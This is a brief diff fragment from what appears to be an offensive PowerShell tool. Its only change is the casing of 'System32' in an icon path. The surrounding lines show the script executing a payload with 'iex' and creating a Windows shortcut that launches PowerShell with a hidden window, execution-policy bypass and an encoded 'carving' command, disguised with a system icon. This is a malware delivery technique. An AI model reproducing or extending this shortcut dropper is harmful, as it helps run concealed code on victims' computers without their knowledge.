@@ -62,7 +62,7 @@ iex $payloadScript;
         $shortcut = $wshShell.CreateShortcut($shortcutOutputPath)
         $shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
         $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCarvingScript"
-        $shortcut.IconLocation = "C:\Windows\system32\SHELL32.dll, 1"
+        $shortcut.IconLocation = "C:\Windows\System32\SHELL32.dll, 1"
         $shortcut.Save()
         Write-Host "Shortcut created successfully." -ForegroundColor "Green"
     } catch {
